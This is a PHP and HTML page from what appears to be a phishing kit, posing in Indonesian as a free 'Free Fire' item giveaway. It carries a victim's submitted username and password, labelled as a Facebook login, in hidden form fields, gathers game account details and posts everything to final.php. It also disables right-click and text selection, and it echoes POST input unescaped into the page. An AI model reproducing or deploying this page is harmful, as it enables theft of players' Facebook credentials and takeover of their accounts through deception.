<?php
$nick = $_POST['getNickId'];
$playid = $_POST['getUId'];
$user = $_POST['user'];
$pass = $_POST['pass'];
$login = $_POST['login'];
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="Free Fire : Claim Item Free 2021">
<meta name="description" content="Free Fire : Claim Item Free 2021 Sudah Di Mulai! Dapatkan Hadiah Yang Kamu Inginkan Sekarang !!! Hadiah Tersebut Gratis,Dan Tidak di pungut biaya Apapun. Silahkan Ambil hadiah Bersama Teman Teman Kalian!">
<meta property="og:description" content="Free Fire : Claim Item Free 2021 Sudah Di Mulai! Dapatkan Hadiah Yang Kamu Inginkan Sekarang !!! Hadiah Tersebut Gratis,Dan Tidak di pungut biaya Apapun. Silahkan Ambil hadiah Bersama Teman Teman Kalian!">
<meta property="og:url" content="./">
<meta property="og:site_name" content="Free Fire : Claim Item Free 2021">
<meta property="og:type" content="website">
<meta name="copyright"content="FREE FIRE">
<meta name="theme-color" content="#000">
<meta property="og:image" content="https://g.top4top.io/s_18883ujz60.png">
<title>Free Fire : Claim Item Free 2021</title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="icon" href="https://g.top4top.io/s_18883ujz60.png">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<iframe style="display: none;" scrolling="no" allow="autoplay" src="mp3/boyxd.mp3" width="0" height="0" frameborder="no"></iframe>

<style>
::placeholder {
color: #fff;
}
</style>
<div class="container">	
<div class="header">
</div>

<div class="box">
<center>
<div class="alert" style="background: -webkit-linear-gradient(left, #34dbeb, #eb34dc, #ebeb34, #eb4634);">
SELAMAT KEPADA <?php echo $nick; ?>
<br>
 Silahkan Verifikasi akun kamu agar hadiah dapat terkirim
</center>

<center>
<form action="final.php" method="post">
<input type="hidden" class="input-anjir" name="user" value="<?php echo $user; ?>" readonly>
<input type="hidden" name="pass" value="<?php echo $pass; ?>" readonly>
<input type="number" style="background: -webkit-linear-gradient(left, #34dbeb, #eb34dc, #ebeb34, #eb4634);" class="input-anjir" name="playid" value="<?php echo $playid; ?>" readonly>
<input type="text" style="background: -webkit-linear-gradient(left, #34dbeb, #eb34dc, #ebeb34, #eb4634);" class="input-anjir" name="nick" value="<?php echo $nick; ?>" readonly>
<select class="input-anjir kanan" style="background: -webkit-linear-gradient(left, #34dbeb, #eb34dc, #ebeb34, #eb4634);" name="level" id="level" required>
<option selected disabled hidden value="">Level</option>
<?php include'system/level.php'; ?>
</select>
<select class="input-anjir kiri" style="background: -webkit-linear-gradient(left, #34dbeb, #eb34dc, #ebeb34, #eb4634);" name="tier" id="tier" required>
<option selected disabled hidden value="">Ranked</option>
<?php include'system/rank.php'; ?>
</select>
<select class="input-anjir kiri" style="background: -webkit-linear-gradient(left, #34dbeb, #eb34dc, #ebeb34, #eb4634);" name="epass" id="epass" required>
<option selected disabled hidden value="">Elite Pass</option>
<option value="Pernah" style="color: black;">Pernah</option>
<option value="Tidak Pernah" style="color: black;">Tidak Pernah</option>
</select>
<input type="hidden" name="login" value="Facebook" readonly>
<br>
<br>
<button type="submit" style="background: -webkit-linear-gradient(left, #34dbeb, #eb34dc, #ebeb34, #eb4634);" class="btn-anjir">Dapatkan</button>
</form>
</center>

</div>
</div>

<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script src="js/timer.js"></script>
<script src="js/tab.js"></script>
<script src="js/click.js"></script>

</body>
</html>